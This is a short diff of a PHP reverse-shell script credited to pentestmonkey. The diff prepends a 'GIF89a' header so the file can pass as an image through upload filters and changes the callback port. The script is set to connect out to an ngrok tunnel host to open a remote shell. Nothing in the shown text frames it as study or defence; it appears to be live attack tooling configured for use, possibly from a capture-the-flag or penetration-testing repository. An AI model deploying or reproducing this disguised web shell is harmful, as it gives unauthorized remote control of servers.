@@ -1,3 +1,4 @@
+GIF89a
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -47,7 +48,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 17451;       // CHANGE THIS
+$port = 17734;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
